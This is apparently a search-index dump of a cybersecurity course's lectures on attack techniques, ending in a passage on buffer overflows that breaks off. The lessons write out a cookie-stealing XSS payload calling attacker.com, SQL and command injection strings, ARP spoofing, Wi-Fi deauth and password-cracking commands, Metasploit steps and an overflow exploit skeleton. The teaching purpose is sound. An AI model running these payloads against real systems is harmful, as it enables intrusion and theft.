is your career - Ethics matter more than legal minimum - Short-term gains vs. long-term trust - When in doubt, ask - Do the right thing even when hard Cybersecurity is not just technical\u2014it's deeply human. Your ethical choices shape the industry, protect users, and define what kind of professional you'll be. Choose wisely.","title":"Key Takeaways"},{"location":"LECTURES/unit9/lesson9-1/","text":"Cyber Threats & Attack Techniques/Exploits Now we get into the offensive side\u2014how attacks actually work. Understanding attack techniques is essential for defense. You can't protect against threats you don't understand. This lesson covers real-world attack methods used by hackers, from reconnaissance to exploitation to post-compromise activity. The Cyber Kill Chain Before diving into specific attacks, understand the typical attack lifecycle. Lockheed Martin developed the Cyber Kill Chain model describing stages of a cyber attack: Reconnaissance : Gather information about target Weaponization : Create malicious payload Delivery : Transmit weapon to target Exploitation : Trigger vulnerability Installation : Install malware/backdoor Command and Control (C2) : Establish communication channel Actions on Objectives : Achieve attacker's goal (steal data, cause damage, etc.) Understanding this chain helps defenders disrupt attacks at various stages. Phase 1: Reconnaissance Reconnaissance is information gathering about a target. The more an attacker knows, the better they can plan their attack. Passive Reconnaissance Gathering information without directly interacting with the target: OSINT (Open Source Intelligence): - Public websites and social media - LinkedIn profiles (find employees, technology stacks) - Job postings (reveal technologies used) - Press releases and news articles - Public financial records - Domain registration information (WHOIS) - Search engines (Google dorking) Example Google dorks: site:target.com filetype:pdf site:target.com inurl:admin site:target.com intitle:\"index of\" \"@target.com\" site:pastebin.com Shodan : Search engine for internet-connected devices - Find exposed databases, webcams, industrial control systems - Identify vulnerable services - Map organization's internet-facing assets The Wayback Machine : View historical versions of websites - Find old vulnerabilities - Discover forgotten subdomains - Locate removed content DNS Enumeration: # Find DNS records dig target.com ANY nslookup -type=any target.com # Find mail servers dig target.com MX # Zone transfer attempt (usually blocked) dig @ns1.target.com target.com AXFR Active Reconnaissance Directly interacting with target systems: Port Scanning (using Nmap): # Basic scan nmap target.com # Service and version detection nmap -sV target.com # OS detection nmap -O target.com # Aggressive scan (combination of techniques) nmap -A target.com # Scan specific ports nmap -p 80,443,8080 target.com # Scan all ports nmap -p- target.com # Stealth SYN scan sudo nmap -sS target.com Network Mapping: # Ping sweep to find live hosts nmap -sn 192.168.1.0/24 # Traceroute traceroute target.com # Identify routing path mtr target.com Web Application Reconnaissance: - Directory enumeration (find hidden pages) - Technology fingerprinting (identify frameworks, CMS) - Subdomain discovery - API endpoint discovery Tools: - Nikto : Web server scanner - Dirb/Dirbuster : Directory brute-forcing - WhatWeb : Website fingerprinting - Amass : Subdomain enumeration Phase 2: Scanning and Enumeration After reconnaissance, attackers probe for specific vulnerabilities. Vulnerability Scanning Automated scanners: - Nessus : Enterprise vulnerability scanner - OpenVAS : Open-source alternative - Nmap scripts : NSE (Nmap Scripting Engine) These tools identify: - Unpatched software - Misconfigurations - Default credentials - Known vulnerabilities (CVEs) Service Enumeration Gather detailed information about discovered services: Banner Grabbing: # Telnet to grab banner telnet target.com 80 HEAD / HTTP/1.0 # Netcat nc target.com 80 HEAD / HTTP/1.0 # Nmap nmap -sV --script=banner target.com SMB Enumeration (Windows shares): # List shares smbclient -L //target.com -N # Enum4linux (comprehensive SMB enumeration) enum4linux -a target.com SNMP Enumeration: # SNMP walk snmpwalk -v2c -c public target.com Web Application Attacks Web applications are a primary attack surface. Let's examine common vulnerabilities: SQL Injection SQL injection allows attackers to execute arbitrary SQL commands by manipulating input. Vulnerable code example: # BAD - vulnerable to SQL injection user_input = request.form['username'] query = f\"SELECT * FROM users WHERE username = '{user_input}'\" cursor.execute(query) Attack: Username: admin'-- Password: anything Resulting query: SELECT * FROM users WHERE username = 'admin'--' AND password = 'hash' -- Everything after -- is commented out, bypassing password check More advanced: ' OR '1'='1 ' UNION SELECT password FROM users-- '; DROP TABLE users;-- Detection: Try injecting: ' , \" , 1'1 , 1\"1 Look for: Database errors, unexpected behavior Tools: - SQLmap : Automated SQL injection tool sqlmap -u \"http://target.com/page?id=1\" --dbs sqlmap -u \"http://target.com/page?id=1\" -D database --tables sqlmap -u \"http://target.com/page?id=1\" -D database -T users --dump Prevention: - Use parameterized queries / prepared statements - Input validation - Least privilege database accounts - WAF (Web Application Firewall) Cross-Site Scripting (XSS) XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. Types: Stored XSS : Script stored in database (most dangerous) Comment field input: <script> // Steal cookies fetch('http://attacker.com/steal?cookie=' + document.cookie); </script> Reflected XSS : Script in URL, reflected back http://target.com/search?q=<script>alert(document.cookie)</script> DOM-based XSS : Client-side script manipulation Impact: - Cookie theft (session hijacking) - Keylogging - Phishing via injected forms - Defacement - Redirect to malicious sites Prevention: - Output encoding/escaping - Content Security Policy (CSP) - HTTPOnly cookies - Input validation Cross-Site Request Forgery (CSRF) CSRF tricks users into performing actions they didn't intend. Example attack: Victim is logged into bank.com. Attacker sends email with: <img src=\"http://bank.com/transfer?to=attacker&amount=1000\"> When victim opens email, their browser automatically sends authenticated request to transfer money. Prevention: - CSRF tokens (random, unpredictable values) - SameSite cookie attribute - Verify origin header - Require re-authentication for sensitive actions Command Injection Application executes system commands with user input without proper sanitization. Vulnerable code: # BAD ip = request.form['ip'] os.system(f'ping -c 4 {ip}') Attack: Input: 8.8.8.8; cat /etc/passwd Executes: ping -c 4 8.8.8.8; cat /etc/passwd Command chaining: - ; - execute multiple commands - && - execute if previous succeeded - || - execute if previous failed - | - pipe output Directory Traversal / Path Traversal Access files outside intended directory. Example: http://target.com/download?file=../../../etc/passwd Can access: - Configuration files - Source code - Sensitive data - System files Prevention: - Input validation - Whitelist allowed files - Canonicalize paths - Restrict file system permissions File Upload Vulnerabilities Uploading malicious files that execute on server. Attacks: 1. Upload PHP shell disguised as image 2. Bypass filters with double extensions: shell.php.jpg 3. Bypass MIME type checks 4. Upload file to accessible directory 5. Navigate to uploaded file, execute commands Prevention: - Validate file type (magic bytes, not just extension) - Store uploads outside web root - Rename uploaded files - Execute with minimal permissions - Scan uploads for malware Network Attacks Man-in-the-Middle (MitM) Attacker intercepts communication between two parties. ARP Spoofing/Poisoning: # Enable IP forwarding echo 1 > /proc/sys/net/ipv4/ip_forward # ARP spoof (using arpspoof) arpspoof -i eth0 -t victim_ip gateway_ip arpspoof -i eth0 -t gateway_ip victim_ip Now all traffic between victim and gateway flows through attacker. DNS Spoofing : Provide false DNS responses SSL Stripping : Downgrade HTTPS to HTTP Session Hijacking : Steal session cookies Tools: - Ettercap : Comprehensive MitM framework - Bettercap : Modern network attack and monitoring tool - mitmproxy : Interactive HTTPS proxy Prevention: - HTTPS everywhere - HSTS (HTTP Strict Transport Security) - Certificate pinning - ARP inspection - Network monitoring Denial of Service (DoS) / Distributed DoS (DDoS) Overwhelm system resources to make service unavailable. Types: Volume-based attacks: - UDP floods - ICMP floods - Amplification attacks (DNS, NTP, SSDP) Protocol attacks: - SYN flood (exhaust connection table) - ACK flood - Fragmentation attacks Application layer attacks: - HTTP flood (legitimate-looking requests) - Slowloris (keep connections open) - XML bomb / Billion laughs attack DDoS : Same attacks from many sources (botnet) Amplification attacks: Attacker spoofs victim's IP, sends small requests to servers that send large responses to victim. Example - DNS amplification: 1. Attacker sends DNS query with spoofed source (victim's IP) 2. DNS server sends large response to victim 3. Amplification factor: 1 byte sent \u2192 100 bytes to victim Prevention: - Rate limiting - Load balancing - CDN services (Cloudflare, Akaike) - DDoS mitigation services - Network filtering - Redundancy Password Attacks Brute Force : Try every possible combination # Hydra - network login brute force hydra -l admin -P wordlist.txt target.com ssh # John the Ripper - password hash cracking john --wordlist=rockyou.txt hashes.txt Dictionary Attack : Try common passwords from wordlist # Hashcat - GPU-accelerated cracking hashcat -m 0 -a 0 hashes.txt rockyou.txt Credential Stuffing : Use leaked credentials from other breaches Pass-the-Hash : Use password hash without cracking it Rainbow Tables : Precomputed hash tables Tools: - Hydra : Network login brute force - John the Ripper : Password cracking - Hashcat : GPU-accelerated cracking - Medusa : Parallel brute-forcing - CeWL : Create custom wordlists from websites Prevention: - Strong password policies - Account lockout after failed attempts - MFA (multi-factor authentication) - Password hashing with salt - Rate limiting - Monitoring for credential stuffing patterns Social Engineering Social engineering exploits human psychology rather than technical vulnerabilities. Phishing Fraudulent attempts to obtain sensitive information. Types: - Email phishing : Mass emails pretending to be legitimate - Spear phishing : Targeted emails to specific individuals - Whaling : Targeted at executives - Smishing : SMS phishing - Vishing : Voice call phishing Tactics: - Urgency (\"Your account will be closed!\") - Authority (\"This is IT, send me your password\") - Fear (\"You've been hacked, click here\") - Curiosity (\"Look at this crazy video of you\") - Greed (\"You've won a prize!\") Prevention: - Security awareness training - Email filtering - Verify unexpected requests through different channel - Check sender addresses carefully - Hover over links before clicking Pretexting Creating fabricated scenario to obtain information. Example: Attacker calls as IT support needing password to \"fix\" problem. Baiting Leaving infected USB drives, offering free downloads, etc. Tailgating / Piggybacking Following authorized person through secure door. Dumpster Diving Searching trash for sensitive information. Best defense against social engineering : User education and healthy skepticism. Wireless Attacks Wi-Fi Attacks WEP Cracking (outdated but still seen): # Capture packets airodump-ng wlan0mon # Crack WEP key aircrack-ng capture.cap WPA/WPA2 Attacks: # Capture handshake airodump-ng -c 6 --bssid [AP MAC] -w capture wlan0mon # Deauth clients to force handshake aireplay-ng --deauth 10 -a [AP MAC] wlan0mon # Crack with wordlist aircrack-ng -w wordlist.txt capture.cap Evil Twin Attack: 1. Create fake access point with same SSID 2. Stronger signal than legitimate AP 3. Users connect to fake AP 4. Intercept all traffic Tools: - Aircrack-ng suite : Complete wireless security toolkit - Wifite : Automated wireless attack tool - Reaver : WPS attack tool - Kismet : Wireless network detector Bluetooth Attacks Bluejacking : Sending unsolicited messages Bluesnarfing : Stealing data from device Bluebugging : Taking control of device Malware and Exploitation Common Malware Types Ransomware : Encrypts files, demands payment Keyloggers : Record keystrokes RATs (Remote Access Trojans): Give attacker full control Banking Trojans : Steal financial credentials Adware/Spyware : Display ads, track behavior Rootkits : Hide malware presence Bootkits : Infect boot process Fileless malware : Runs in memory, no files written to disk Exploitation Frameworks Metasploit : Most popular exploitation framework # Start Metasploit msfconsole # Search for exploits search apache # Use an exploit use exploit/unix/webapp/php_cgi_arg_injection # Set options set RHOST target.com set RPORT 80 # Run exploit exploit Components: - Exploits : Code that takes advantage of vulnerabilities - Payloads : Code that runs after successful exploit (shell, meterpreter) - Encoders : Obfuscate payloads to evade detection - Post modules : Run after compromise (escalate privileges, pivot) Post-Exploitation After gaining initial access, attackers: Privilege Escalation Vertical escalation : Low privilege \u2192 high privilege (user \u2192 root) Horizontal escalation : Access other users' accounts Linux privilege escalation: - SUID binaries with vulnerabilities - Kernel exploits - Misconfigured sudo - Writable system files - Cron jobs as root Windows privilege escalation: - Unpatched vulnerabilities - Misconfigured services - Weak registry/file permissions - Token impersonation - DLL hijacking Persistence Maintaining access after reboot or remediation. Methods: - Create backdoor accounts - Install rootkits - Modify startup scripts - Schedule tasks - Web shells - Remote access tools Lateral Movement Moving from initially compromised system to other systems. Techniques: - Pass-the-hash - Credential dumping - Exploiting trust relationships - Remote command execution - Pivoting through compromised systems Data Exfiltration Stealing data without detection. Methods: - FTP/HTTP upload - DNS tunneling - Steganography - Encrypted channels - Physical media - Cloud storage Advanced Persistent Threats (APTs) Sophisticated, prolonged attacks (often nation-state): Characteristics: - Well-funded, skilled attackers - Specific targets - Long-term access - Custom malware - Multiple attack vectors - Attempts to avoid detection Kill chain: 1. Initial reconnaissance 2. Initial compromise (spear phishing, zero-day exploits) 3. Establish foothold 4. Escalate privileges 5. Internal reconnaissance 6. Lateral movement 7. Maintain presence 8. Exfiltrate data Examples: - APT28/Fancy Bear (Russian) - APT29/Cozy Bear (Russian) - APT1/Comment Crew (Chinese) - Equation Group (NSA) Detection and Attribution Indicators of Compromise (IoCs) Evidence of intrusion: - Unusual network traffic - Suspicious processes - New user accounts - Modified system files - Registry changes - Unexpected outbound connections Tactics, Techniques, and Procedures (TTPs) Behavioral patterns of threat actors. MITRE ATT&CK Framework : Knowledge base of adversary tactics and techniques Categories: - Initial Access - Execution - Persistence - Privilege Escalation - Defense Evasion - Credential Access - Discovery - Lateral Movement - Collection - Command and Control - Exfiltration - Impact Used for threat modeling and detection development. Key Takeaways Understanding attacks requires knowing: 1. Kill chain stages : Reconnaissance \u2192 Exploitation \u2192 Post-compromise 2. Common vulnerabilities : SQL injection, XSS, misconfigurations 3. Attack types : Network, web, wireless, social engineering 4. Tools : Nmap, Metasploit, Burp Suite, Wireshark 5. Post-exploitation : Escalation, persistence, lateral movement Remember : This knowledge is for defense. Understanding how attacks work enables you to: - Identify vulnerabilities before attackers do - Detect attacks in progress - Design better security controls - Respond effectively to incidents In the next lesson, we'll cover defensive techniques and how to protect against these attacks.","title":"Lesson 9.1"},{"location":"LECTURES/unit9/lesson9-1/#cyber-threats-attack-techniquesexploits","text":"Now we get into the offensive side\u2014how attacks actually work. Understanding attack techniques is essential for defense. You can't protect against threats you don't understand. This lesson covers real-world attack methods used by hackers, from reconnaissance to exploitation to post-compromise activity.","title":"Cyber Threats &amp; Attack Techniques/Exploits"},{"location":"LECTURES/unit9/lesson9-1/#the-cyber-kill-chain","text":"Before diving into specific attacks, understand the typical attack lifecycle. Lockheed Martin developed the Cyber Kill Chain model describing stages of a cyber attack: Reconnaissance : Gather information about target Weaponization : Create malicious payload Delivery : Transmit weapon to target Exploitation : Trigger vulnerability Installation : Install malware/backdoor Command and Control (C2) : Establish communication channel Actions on Objectives : Achieve attacker's goal (steal data, cause damage, etc.) Understanding this chain helps defenders disrupt attacks at various stages.","title":"The Cyber Kill Chain"},{"location":"LECTURES/unit9/lesson9-1/#phase-1-reconnaissance","text":"Reconnaissance is information gathering about a target. The more an attacker knows, the better they can plan their attack.","title":"Phase 1: Reconnaissance"},{"location":"LECTURES/unit9/lesson9-1/#passive-reconnaissance","text":"Gathering information without directly interacting with the target: OSINT (Open Source Intelligence): - Public websites and social media - LinkedIn profiles (find employees, technology stacks) - Job postings (reveal technologies used) - Press releases and news articles - Public financial records - Domain registration information (WHOIS) - Search engines (Google dorking) Example Google dorks: site:target.com filetype:pdf site:target.com inurl:admin site:target.com intitle:\"index of\" \"@target.com\" site:pastebin.com Shodan : Search engine for internet-connected devices - Find exposed databases, webcams, industrial control systems - Identify vulnerable services - Map organization's internet-facing assets The Wayback Machine : View historical versions of websites - Find old vulnerabilities - Discover forgotten subdomains - Locate removed content DNS Enumeration: # Find DNS records dig target.com ANY nslookup -type=any target.com # Find mail servers dig target.com MX # Zone transfer attempt (usually blocked) dig @ns1.target.com target.com AXFR","title":"Passive Reconnaissance"},{"location":"LECTURES/unit9/lesson9-1/#active-reconnaissance","text":"Directly interacting with target systems: Port Scanning (using Nmap): # Basic scan nmap target.com # Service and version detection nmap -sV target.com # OS detection nmap -O target.com # Aggressive scan (combination of techniques) nmap -A target.com # Scan specific ports nmap -p 80,443,8080 target.com # Scan all ports nmap -p- target.com # Stealth SYN scan sudo nmap -sS target.com Network Mapping: # Ping sweep to find live hosts nmap -sn 192.168.1.0/24 # Traceroute traceroute target.com # Identify routing path mtr target.com Web Application Reconnaissance: - Directory enumeration (find hidden pages) - Technology fingerprinting (identify frameworks, CMS) - Subdomain discovery - API endpoint discovery Tools: - Nikto : Web server scanner - Dirb/Dirbuster : Directory brute-forcing - WhatWeb : Website fingerprinting - Amass : Subdomain enumeration","title":"Active Reconnaissance"},{"location":"LECTURES/unit9/lesson9-1/#phase-2-scanning-and-enumeration","text":"After reconnaissance, attackers probe for specific vulnerabilities.","title":"Phase 2: Scanning and Enumeration"},{"location":"LECTURES/unit9/lesson9-1/#vulnerability-scanning","text":"Automated scanners: - Nessus : Enterprise vulnerability scanner - OpenVAS : Open-source alternative - Nmap scripts : NSE (Nmap Scripting Engine) These tools identify: - Unpatched software - Misconfigurations - Default credentials - Known vulnerabilities (CVEs)","title":"Vulnerability Scanning"},{"location":"LECTURES/unit9/lesson9-1/#service-enumeration","text":"Gather detailed information about discovered services: Banner Grabbing: # Telnet to grab banner telnet target.com 80 HEAD / HTTP/1.0 # Netcat nc target.com 80 HEAD / HTTP/1.0 # Nmap nmap -sV --script=banner target.com SMB Enumeration (Windows shares): # List shares smbclient -L //target.com -N # Enum4linux (comprehensive SMB enumeration) enum4linux -a target.com SNMP Enumeration: # SNMP walk snmpwalk -v2c -c public target.com","title":"Service Enumeration"},{"location":"LECTURES/unit9/lesson9-1/#web-application-attacks","text":"Web applications are a primary attack surface. Let's examine common vulnerabilities:","title":"Web Application Attacks"},{"location":"LECTURES/unit9/lesson9-1/#sql-injection","text":"SQL injection allows attackers to execute arbitrary SQL commands by manipulating input. Vulnerable code example: # BAD - vulnerable to SQL injection user_input = request.form['username'] query = f\"SELECT * FROM users WHERE username = '{user_input}'\" cursor.execute(query) Attack: Username: admin'-- Password: anything Resulting query: SELECT * FROM users WHERE username = 'admin'--' AND password = 'hash' -- Everything after -- is commented out, bypassing password check More advanced: ' OR '1'='1 ' UNION SELECT password FROM users-- '; DROP TABLE users;-- Detection: Try injecting: ' , \" , 1'1 , 1\"1 Look for: Database errors, unexpected behavior Tools: - SQLmap : Automated SQL injection tool sqlmap -u \"http://target.com/page?id=1\" --dbs sqlmap -u \"http://target.com/page?id=1\" -D database --tables sqlmap -u \"http://target.com/page?id=1\" -D database -T users --dump Prevention: - Use parameterized queries / prepared statements - Input validation - Least privilege database accounts - WAF (Web Application Firewall)","title":"SQL Injection"},{"location":"LECTURES/unit9/lesson9-1/#cross-site-scripting-xss","text":"XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. Types: Stored XSS : Script stored in database (most dangerous) Comment field input: <script> // Steal cookies fetch('http://attacker.com/steal?cookie=' + document.cookie); </script> Reflected XSS : Script in URL, reflected back http://target.com/search?q=<script>alert(document.cookie)</script> DOM-based XSS : Client-side script manipulation Impact: - Cookie theft (session hijacking) - Keylogging - Phishing via injected forms - Defacement - Redirect to malicious sites Prevention: - Output encoding/escaping - Content Security Policy (CSP) - HTTPOnly cookies - Input validation","title":"Cross-Site Scripting (XSS)"},{"location":"LECTURES/unit9/lesson9-1/#cross-site-request-forgery-csrf","text":"CSRF tricks users into performing actions they didn't intend. Example attack: Victim is logged into bank.com. Attacker sends email with: <img src=\"http://bank.com/transfer?to=attacker&amount=1000\"> When victim opens email, their browser automatically sends authenticated request to transfer money. Prevention: - CSRF tokens (random, unpredictable values) - SameSite cookie attribute - Verify origin header - Require re-authentication for sensitive actions","title":"Cross-Site Request Forgery (CSRF)"},{"location":"LECTURES/unit9/lesson9-1/#command-injection","text":"Application executes system commands with user input without proper sanitization. Vulnerable code: # BAD ip = request.form['ip'] os.system(f'ping -c 4 {ip}') Attack: Input: 8.8.8.8; cat /etc/passwd Executes: ping -c 4 8.8.8.8; cat /etc/passwd Command chaining: - ; - execute multiple commands - && - execute if previous succeeded - || - execute if previous failed - | - pipe output","title":"Command Injection"},{"location":"LECTURES/unit9/lesson9-1/#directory-traversal-path-traversal","text":"Access files outside intended directory. Example: http://target.com/download?file=../../../etc/passwd Can access: - Configuration files - Source code - Sensitive data - System files Prevention: - Input validation - Whitelist allowed files - Canonicalize paths - Restrict file system permissions","title":"Directory Traversal / Path Traversal"},{"location":"LECTURES/unit9/lesson9-1/#file-upload-vulnerabilities","text":"Uploading malicious files that execute on server. Attacks: 1. Upload PHP shell disguised as image 2. Bypass filters with double extensions: shell.php.jpg 3. Bypass MIME type checks 4. Upload file to accessible directory 5. Navigate to uploaded file, execute commands Prevention: - Validate file type (magic bytes, not just extension) - Store uploads outside web root - Rename uploaded files - Execute with minimal permissions - Scan uploads for malware","title":"File Upload Vulnerabilities"},{"location":"LECTURES/unit9/lesson9-1/#network-attacks","text":"","title":"Network Attacks"},{"location":"LECTURES/unit9/lesson9-1/#man-in-the-middle-mitm","text":"Attacker intercepts communication between two parties. ARP Spoofing/Poisoning: # Enable IP forwarding echo 1 > /proc/sys/net/ipv4/ip_forward # ARP spoof (using arpspoof) arpspoof -i eth0 -t victim_ip gateway_ip arpspoof -i eth0 -t gateway_ip victim_ip Now all traffic between victim and gateway flows through attacker. DNS Spoofing : Provide false DNS responses SSL Stripping : Downgrade HTTPS to HTTP Session Hijacking : Steal session cookies Tools: - Ettercap : Comprehensive MitM framework - Bettercap : Modern network attack and monitoring tool - mitmproxy : Interactive HTTPS proxy Prevention: - HTTPS everywhere - HSTS (HTTP Strict Transport Security) - Certificate pinning - ARP inspection - Network monitoring","title":"Man-in-the-Middle (MitM)"},{"location":"LECTURES/unit9/lesson9-1/#denial-of-service-dos-distributed-dos-ddos","text":"Overwhelm system resources to make service unavailable. Types: Volume-based attacks: - UDP floods - ICMP floods - Amplification attacks (DNS, NTP, SSDP) Protocol attacks: - SYN flood (exhaust connection table) - ACK flood - Fragmentation attacks Application layer attacks: - HTTP flood (legitimate-looking requests) - Slowloris (keep connections open) - XML bomb / Billion laughs attack DDoS : Same attacks from many sources (botnet) Amplification attacks: Attacker spoofs victim's IP, sends small requests to servers that send large responses to victim. Example - DNS amplification: 1. Attacker sends DNS query with spoofed source (victim's IP) 2. DNS server sends large response to victim 3. Amplification factor: 1 byte sent \u2192 100 bytes to victim Prevention: - Rate limiting - Load balancing - CDN services (Cloudflare, Akaike) - DDoS mitigation services - Network filtering - Redundancy","title":"Denial of Service (DoS) / Distributed DoS (DDoS)"},{"location":"LECTURES/unit9/lesson9-1/#password-attacks","text":"Brute Force : Try every possible combination # Hydra - network login brute force hydra -l admin -P wordlist.txt target.com ssh # John the Ripper - password hash cracking john --wordlist=rockyou.txt hashes.txt Dictionary Attack : Try common passwords from wordlist # Hashcat - GPU-accelerated cracking hashcat -m 0 -a 0 hashes.txt rockyou.txt Credential Stuffing : Use leaked credentials from other breaches Pass-the-Hash : Use password hash without cracking it Rainbow Tables : Precomputed hash tables Tools: - Hydra : Network login brute force - John the Ripper : Password cracking - Hashcat : GPU-accelerated cracking - Medusa : Parallel brute-forcing - CeWL : Create custom wordlists from websites Prevention: - Strong password policies - Account lockout after failed attempts - MFA (multi-factor authentication) - Password hashing with salt - Rate limiting - Monitoring for credential stuffing patterns","title":"Password Attacks"},{"location":"LECTURES/unit9/lesson9-1/#social-engineering","text":"Social engineering exploits human psychology rather than technical vulnerabilities.","title":"Social Engineering"},{"location":"LECTURES/unit9/lesson9-1/#phishing","text":"Fraudulent attempts to obtain sensitive information. Types: - Email phishing : Mass emails pretending to be legitimate - Spear phishing : Targeted emails to specific individuals - Whaling : Targeted at executives - Smishing : SMS phishing - Vishing : Voice call phishing Tactics: - Urgency (\"Your account will be closed!\") - Authority (\"This is IT, send me your password\") - Fear (\"You've been hacked, click here\") - Curiosity (\"Look at this crazy video of you\") - Greed (\"You've won a prize!\") Prevention: - Security awareness training - Email filtering - Verify unexpected requests through different channel - Check sender addresses carefully - Hover over links before clicking","title":"Phishing"},{"location":"LECTURES/unit9/lesson9-1/#pretexting","text":"Creating fabricated scenario to obtain information. Example: Attacker calls as IT support needing password to \"fix\" problem.","title":"Pretexting"},{"location":"LECTURES/unit9/lesson9-1/#baiting","text":"Leaving infected USB drives, offering free downloads, etc.","title":"Baiting"},{"location":"LECTURES/unit9/lesson9-1/#tailgating-piggybacking","text":"Following authorized person through secure door.","title":"Tailgating / Piggybacking"},{"location":"LECTURES/unit9/lesson9-1/#dumpster-diving","text":"Searching trash for sensitive information. Best defense against social engineering : User education and healthy skepticism.","title":"Dumpster Diving"},{"location":"LECTURES/unit9/lesson9-1/#wireless-attacks","text":"","title":"Wireless Attacks"},{"location":"LECTURES/unit9/lesson9-1/#wi-fi-attacks","text":"WEP Cracking (outdated but still seen): # Capture packets airodump-ng wlan0mon # Crack WEP key aircrack-ng capture.cap WPA/WPA2 Attacks: # Capture handshake airodump-ng -c 6 --bssid [AP MAC] -w capture wlan0mon # Deauth clients to force handshake aireplay-ng --deauth 10 -a [AP MAC] wlan0mon # Crack with wordlist aircrack-ng -w wordlist.txt capture.cap Evil Twin Attack: 1. Create fake access point with same SSID 2. Stronger signal than legitimate AP 3. Users connect to fake AP 4. Intercept all traffic Tools: - Aircrack-ng suite : Complete wireless security toolkit - Wifite : Automated wireless attack tool - Reaver : WPS attack tool - Kismet : Wireless network detector","title":"Wi-Fi Attacks"},{"location":"LECTURES/unit9/lesson9-1/#bluetooth-attacks","text":"Bluejacking : Sending unsolicited messages Bluesnarfing : Stealing data from device Bluebugging : Taking control of device","title":"Bluetooth Attacks"},{"location":"LECTURES/unit9/lesson9-1/#malware-and-exploitation","text":"","title":"Malware and Exploitation"},{"location":"LECTURES/unit9/lesson9-1/#common-malware-types","text":"Ransomware : Encrypts files, demands payment Keyloggers : Record keystrokes RATs (Remote Access Trojans): Give attacker full control Banking Trojans : Steal financial credentials Adware/Spyware : Display ads, track behavior Rootkits : Hide malware presence Bootkits : Infect boot process Fileless malware : Runs in memory, no files written to disk","title":"Common Malware Types"},{"location":"LECTURES/unit9/lesson9-1/#exploitation-frameworks","text":"Metasploit : Most popular exploitation framework # Start Metasploit msfconsole # Search for exploits search apache # Use an exploit use exploit/unix/webapp/php_cgi_arg_injection # Set options set RHOST target.com set RPORT 80 # Run exploit exploit Components: - Exploits : Code that takes advantage of vulnerabilities - Payloads : Code that runs after successful exploit (shell, meterpreter) - Encoders : Obfuscate payloads to evade detection - Post modules : Run after compromise (escalate privileges, pivot)","title":"Exploitation Frameworks"},{"location":"LECTURES/unit9/lesson9-1/#post-exploitation","text":"After gaining initial access, attackers:","title":"Post-Exploitation"},{"location":"LECTURES/unit9/lesson9-1/#privilege-escalation","text":"Vertical escalation : Low privilege \u2192 high privilege (user \u2192 root) Horizontal escalation : Access other users' accounts Linux privilege escalation: - SUID binaries with vulnerabilities - Kernel exploits - Misconfigured sudo - Writable system files - Cron jobs as root Windows privilege escalation: - Unpatched vulnerabilities - Misconfigured services - Weak registry/file permissions - Token impersonation - DLL hijacking","title":"Privilege Escalation"},{"location":"LECTURES/unit9/lesson9-1/#persistence","text":"Maintaining access after reboot or remediation. Methods: - Create backdoor accounts - Install rootkits - Modify startup scripts - Schedule tasks - Web shells - Remote access tools","title":"Persistence"},{"location":"LECTURES/unit9/lesson9-1/#lateral-movement","text":"Moving from initially compromised system to other systems. Techniques: - Pass-the-hash - Credential dumping - Exploiting trust relationships - Remote command execution - Pivoting through compromised systems","title":"Lateral Movement"},{"location":"LECTURES/unit9/lesson9-1/#data-exfiltration","text":"Stealing data without detection. Methods: - FTP/HTTP upload - DNS tunneling - Steganography - Encrypted channels - Physical media - Cloud storage","title":"Data Exfiltration"},{"location":"LECTURES/unit9/lesson9-1/#advanced-persistent-threats-apts","text":"Sophisticated, prolonged attacks (often nation-state): Characteristics: - Well-funded, skilled attackers - Specific targets - Long-term access - Custom malware - Multiple attack vectors - Attempts to avoid detection Kill chain: 1. Initial reconnaissance 2. Initial compromise (spear phishing, zero-day exploits) 3. Establish foothold 4. Escalate privileges 5. Internal reconnaissance 6. Lateral movement 7. Maintain presence 8. Exfiltrate data Examples: - APT28/Fancy Bear (Russian) - APT29/Cozy Bear (Russian) - APT1/Comment Crew (Chinese) - Equation Group (NSA)","title":"Advanced Persistent Threats (APTs)"},{"location":"LECTURES/unit9/lesson9-1/#detection-and-attribution","text":"","title":"Detection and Attribution"},{"location":"LECTURES/unit9/lesson9-1/#indicators-of-compromise-iocs","text":"Evidence of intrusion: - Unusual network traffic - Suspicious processes - New user accounts - Modified system files - Registry changes - Unexpected outbound connections","title":"Indicators of Compromise (IoCs)"},{"location":"LECTURES/unit9/lesson9-1/#tactics-techniques-and-procedures-ttps","text":"Behavioral patterns of threat actors. MITRE ATT&CK Framework : Knowledge base of adversary tactics and techniques Categories: - Initial Access - Execution - Persistence - Privilege Escalation - Defense Evasion - Credential Access - Discovery - Lateral Movement - Collection - Command and Control - Exfiltration - Impact Used for threat modeling and detection development.","title":"Tactics, Techniques, and Procedures (TTPs)"},{"location":"LECTURES/unit9/lesson9-1/#key-takeaways","text":"Understanding attacks requires knowing: 1. Kill chain stages : Reconnaissance \u2192 Exploitation \u2192 Post-compromise 2. Common vulnerabilities : SQL injection, XSS, misconfigurations 3. Attack types : Network, web, wireless, social engineering 4. Tools : Nmap, Metasploit, Burp Suite, Wireshark 5. Post-exploitation : Escalation, persistence, lateral movement Remember : This knowledge is for defense. Understanding how attacks work enables you to: - Identify vulnerabilities before attackers do - Detect attacks in progress - Design better security controls - Respond effectively to incidents In the next lesson, we'll cover defensive techniques and how to protect against these attacks.","title":"Key Takeaways"},{"location":"LECTURES/unit9/lesson9-2/","text":"Advanced Exploitation Techniques Beyond basic attacks, sophisticated threat actors use advanced exploitation techniques to compromise systems, evade detection, and maintain persistence. This lesson explores modern exploitation methods used in real-world attacks. Memory Corruption Exploits Buffer Overflows How it works: Program writes data beyond buffer boundary, overwriting adjacent memory. Stack buffer overflow example: #include <stdio.h> #include <string.h> void vulnerable_function(char *input) { char buffer[64]; strcpy(buffer, input); // No bounds checking! printf(\"Input: %s\\n\", buffer); } int main(int argc, char *argv[]) { if (argc > 1) { vulnerable_function(argv[1]); } return 0; } Exploitation: import struct # Create payload buffer_size = 64 padding = b\"A\" * buffer_size # Overwrite saved EIP (return address) # This is the address we want to jump to new_eip = struct.pack(\"<I\", 0x08048484) # Address of shellcode # Add shellcode (or ROP chain) shellcode = b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68...\" payload = padding + new_eip + shellcode print(payload) Modern protections: - ASLR (Address Space Layout Randomization) : Randomizes memory locations - DEP/NX (Data Execution Prevention) : Marks stack as non-executable - Stack canaries : Detects buffer overflow before return - RELRO : Makes GOT read-only Return-Oriented Programming (ROP) Bypasses DEP/NX by reusing existing code. How it works: - Find \"gadgets\" (instruction sequences ending in ret ) - Chain gadgets together - Execute existing code in new order Example gadgets: ; Gadget 1: pop rdi; 